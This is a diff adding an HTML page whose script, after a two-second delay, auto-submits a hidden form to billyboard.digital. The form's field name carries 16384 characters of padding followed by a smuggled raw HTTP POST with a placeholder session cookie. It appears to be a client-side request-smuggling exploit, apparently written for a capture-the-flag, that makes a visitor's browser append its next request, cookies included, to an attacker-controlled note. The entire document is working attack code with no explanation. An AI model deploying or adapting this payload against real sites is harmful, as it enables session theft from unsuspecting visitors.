@@ -1,0 +1,43 @@
+<script>
+
+
+    const dynamicFormRequest = async () => {
+        let payload = `POST / HTTP/1.1
+content-type: application/x-www-form-urlencoded
+Connection: keep-alive
+Host: apache
+Content-Length: 680
+Cookie: PHPSESSID=__PHPSESSID__
+
+note`
+
+        let url = 'https://billyboard.digital'
+
+        let f = document.createElement('form')
+        f.method = 'POST'
+        f.action = url
+
+        f.enctype = 'text/plain'
+
+        let i = document.createElement('input')
+        i.name = `${'A'.repeat(16384)}${payload}`.replace(/\n/g, '\r\n')
+        i.value = ''
+        f.appendChild(i)
+
+
+        document.body.appendChild(f)
+        f.submit()
+    }
+
+    console.log('Loaded payload.html')
+
+    setTimeout(() => {
+        console.log('Submitting form...')
+        dynamicFormRequest()
+    }, 2000)
+
+
+
+
+</script>
+
